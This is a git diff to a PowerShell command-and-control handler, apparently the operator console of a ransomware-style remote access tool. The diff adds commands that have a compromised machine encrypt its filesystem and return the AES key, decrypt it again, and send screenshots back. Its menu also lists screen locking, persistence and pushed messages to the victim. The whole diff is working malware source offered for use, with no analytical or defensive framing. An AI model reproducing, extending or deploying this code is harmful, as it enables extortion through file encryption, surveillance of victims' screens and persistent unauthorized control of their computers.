@@ -24,6 +24,7 @@ function PSHandler($port)
 
             while($true)
             {
+                $key_file              = ''
                 $transmitter           = New-Object System.IO.StreamWriter($stream)
                 $receiver              = New-Object System.IO.StreamReader($stream)
                 $plaintext_cmd         = Read-Host "[*]>>>"
@@ -59,7 +60,7 @@ function PSHandler($port)
                     {
                         $command  = $plaintext_cmd.Split(' ')[0]
                         $filename = $plaintext_cmd.Split(' ')[1]
-                        $transmission = "$command $filename" ; WRite-Host $transmission
+                        $transmission = "$command $filename" ; 
                         $transmitter.WriteLine($transmission)
                         $transmitter.Flush()
                         Write-Host "[~] Awaiting download..."
@@ -71,15 +72,52 @@ function PSHandler($port)
                         $cmd           = [System.Text.Encoding]::Unicode.GetBytes($plaintext_cmd)
                         $cmd           = [Convert]::ToBase64String($cmd)
                     }
-                    if($plaintext_cmd | Select-String 'genkey')
+                    if($plaintext_cmd | Select-String 'encryptfs')
                     {
-                        $cmd = [System.Text.Encoding]::Unicode.GetBytes($plaintext_cmd)
-                        $cmd = [Convert]::ToBase64String($cmd)
-                        $transmitter.WriteLine($cmd)
+                        Write-Host "[~] Sending 'encryptfs' ..."
+                        $transmitter.WriteLine($plaintext_cmd)
                         $transmitter.Flush()
+                        Write-Host "[~] Awaiting key file transfer..."
+                        $download = $receiver.ReadLine()
+                        $content  = [System.Convert]::FromBase64String($download)
+                        $filename = 'aes.key'
+                        Set-Content -Path ".\$filename" -Value $content -Encoding Byte
+                        Write-Host "[*] Retrieved: $filename "
                         $plaintext_cmd = Read-Host "[*]>>>"
                         $cmd           = [System.Text.Encoding]::Unicode.GetBytes($plaintext_cmd)
                         $cmd           = [Convert]::ToBase64String($cmd)
+                    }
+                    if($plaintext_cmd | Select-String 'decryptfs')
+                    {
+                        Write-Host "[~] Sending 'decryptfs' ..."
+                        $transmission = '' 
+                        $command      = 'decryptfs' 
+                        $filename     = 'aes.key'
+                        $filename     = Split-Path $filename -Leaf
+                        $filecontent  =  Get-Content $filename -Encoding Byte
+                        $filecontent  = [System.Convert]::ToBase64String($filecontent)
+                        $transmission = "$command#$filename#$filecontent"
+                        $transmitter.WriteLine($transmission)
+                        $transmitter.Flush()
+                        $cmd           = [System.Text.Encoding]::Unicode.GetBytes($plaintext_cmd)
+                        $cmd           = [Convert]::ToBase64String($cmd)
+                    }
+                    if($plaintext_cmd | Select-String 'screenshot')
+                    {
+                        $transmitter.WriteLine($plaintext_cmd)
+                        $transmitter.Flush()
+                        Write-Host "[~] Waiting for the screen shot..."
+                        $download = $receiver.ReadLine()
+                        $segments = $download.Split('#')
+                        $filename = $segments[0]
+                        $data     = $segments[1]
+                        $content  = [System.Convert]::FromBase64String($data)
+                        Set-Content -Path ".\$filename" -Value $data -Encoding Byte -ErrorAction SilentlyContinue
+                        Write-Host "[*] Retrieved: $filename "
+                        $plaintext_cmd = Read-Host "[*]>>>"
+                        $cmd           = [System.Text.Encoding]::Unicode.GetBytes($plaintext_cmd)
+                        $cmd           = [Convert]::ToBase64String($cmd)
+                        
                     }
                     if(($plaintext_cmd | Select-String 'clear') -or ($plaintext_cmd | Select-String 'cls') -or ($plaintext_cmd | Select-String 'Clear-Host'))
                     {
@@ -94,11 +132,6 @@ function PSHandler($port)
                     }
                     if(($plaintext_cmd | Select-String 'menu'))
                     {
-                        $cmd = [System.Text.Encoding]::Unicode.GetBytes($plaintext_cmd)
-                        $cmd = [Convert]::ToBase64String($cmd)
-                        $transmitter.WriteLine($cmd)
-                        $transmitter.Flush()
-
                         Write-Host "
                         [*] PowerShell - Handler - Help Menu
                         ------------------------------------
@@ -106,16 +139,17 @@ function PSHandler($port)
                         ------------------------------------
                         1)  Transfer to host   - Syntax: 'send <filename>'     
                         2)  Download from host - Syntax: 'download <filename>'
-                        3)  Generate AES Key   - Syntax: 'genkey'
-                        4)  Transfer Key       - Syntax: 'retkey'
-                        5)  Remove AES Key     - Syntax: 'remkey'
-                        6)  Encryption         - Syntax: 'encryptfs'
-                        7)  Decryption         - Syntax: 'decryptfs'
-                        8)  ScreenShot         - Syntax: 'capture'
-                        9)  Set Persistence    - Syntax: 'persist'
+                        3)  Encrypt Filesystem - Syntax: 'encryptfs'
+                        4)  Decrypt Filesystem - Syntax: 'decryptfs'
+                        5)  Lock Screen        - Syntax: 'lockscreen'
+                        6)  Take Screenshot    - Syntax: 'screenshot'
+                        7)  Set Persistence    - Syntax: 'persist'
+                        8)  Display Message    - Syntax: 'staticmessage'
+                        9)  Send Toast Message - Syntax: 'toast <data>'
                         10) Invoke help        - Syntax: 'help'
                         11) Exit               - Syntax: 'exit' 
                         "
+                        continue
                     }
                     try
                     {
